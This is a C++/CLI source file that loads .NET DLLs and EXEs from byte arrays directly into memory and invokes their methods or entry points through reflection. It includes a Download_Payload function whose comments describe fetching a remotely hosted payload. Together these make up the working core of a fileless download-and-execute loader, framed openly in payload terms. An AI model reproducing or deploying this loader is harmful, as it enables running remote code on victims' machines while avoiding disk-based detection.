#include "stdafx.h"
#using <mscorlib.dll>
#include "native.h" //Lets you call your native functions.
#include "managed.h"
#include <vector>

// Load a managed DLL from a byte array and call a static method in the DLL.
// Can pass in an array of strings as parameters
//
// dll - the byte array containing the DLL
// dllLength - the length of 'dll'
// className - the name of the class with a static method to call.
// methodName - the static method to call. Must expect no parameters.
// numParams - the number of string parameters passed in
// params - and array of C strings containing the parameters
extern void LaunchDll(
	unsigned char *dll, size_t dllLength,
	char const *className, char const *methodName,
	size_t numParams, char const **params)//TODO: Get an array of parameters passed in and working.
{
	// convert passed in parameter to managed values
	cli::array<unsigned char>^ mdll = gcnew cli::array<unsigned char>(dllLength);
	System::Runtime::InteropServices::Marshal::Copy(
		(System::IntPtr)dll, mdll, 0, mdll->Length);
	System::String^ cn =
		System::Runtime::InteropServices::Marshal::PtrToStringAnsi(
		(System::IntPtr)(char*)className);
	System::String^ mn =
		System::Runtime::InteropServices::Marshal::PtrToStringAnsi(
		(System::IntPtr)(char*)methodName);

	if (numParams > 0)
	{
		//Convert the parameters into a vector of C++ strings, which are easier to use.
		vector<std::string> strings(params, params + numParams);

		// Create array of Strings to pass in as parameters to the specific DLL method
		// .NET EXEs take an Object Array containing a string array of command-line arguments
		cli::array< System::String^ >^ args = gcnew cli::array< System::String^ >(numParams);

		//Copy the unmanaged strings into a managed array of Strings
		for (int i = 0; i < strings.size(); i++)
		{
			args[i] = gcnew System::String(strings[i].c_str());
		}

		// used the converted parameters to load the DLL, find, and call the method, passing in parameters.
		System::Reflection::Assembly^ a = System::Reflection::Assembly::Load(mdll);
		a->GetType(cn)->GetMethod(mn)->Invoke(nullptr, args);
	}
	else
	{
		// used the converted parameters to load the DLL, find, and call the method, passing in parameters.
		System::Reflection::Assembly^ a = System::Reflection::Assembly::Load(mdll);
		a->GetType(cn)->GetMethod(mn)->Invoke(nullptr, nullptr);
	}
}

// Load a managed EXE from a byte array and invoke the main entry point.
//
// exe - the byte array containing the EXE
// exeLength - the length of 'exe'
// numParams - the number of string parameters passed in
// params - and array of C strings containing the parameters
void LaunchEXE(
	unsigned char *exe, size_t exeLength, size_t numParams, char const** params)
{

	// convert passed in exe to managed values
	cli::array<unsigned char>^ mexe = gcnew cli::array<unsigned char>(exeLength);
	System::Runtime::InteropServices::Marshal::Copy(
		(System::IntPtr)exe, mexe, 0, mexe->Length);

	//Convert the parameters into a vector of C++ strings, which are easier to use.
	std::vector<std::string> strings(params, params + numParams);

	// Create array of Strings to pass in as parameters to EXE Entry Point
	// .NET EXEs take an Object Array containing a string array of command-line arguments
	cli::array< System::String^ >^ args = gcnew cli::array< System::String^ >(numParams);

	//Copy the unmanaged strings into a managed array of Strings
	for (int i = 0; i < strings.size(); i++)
	{
		args[i] = gcnew System::String(strings[i].c_str());
	}

	//Create an array of managed Objects.
	cli::array< System::Object^ >^ arr = gcnew cli::array< System::Object^ >(1);

	//Add in the parameters.
	arr[0] = args;

	// used the converted parameters to load the DLL, find, and call the method.
	System::Reflection::Assembly^ a = System::Reflection::Assembly::Load(mexe);
	a->EntryPoint->Invoke(nullptr, arr);
	//TODO: Fix this later ^^. https://docs.microsoft.com/en-us/cpp/dotnet/how-to-use-arrays-in-cpp-cli?view=vs-2017
}

//A utility function for downloading a file from a URI. Can be used to load a payload hosted remotely.
cli::array<unsigned char>^ Download_Payload(System::String ^uri)
{

	//Downloads the Assembly from a hardcoded URI. Comment out the stuff above.

	System::Net::WebClient ^_client = gcnew System::Net::WebClient();

	//System::Console::WriteLine("Downloading payload from: " + uri);

	return _client->DownloadData(uri);
}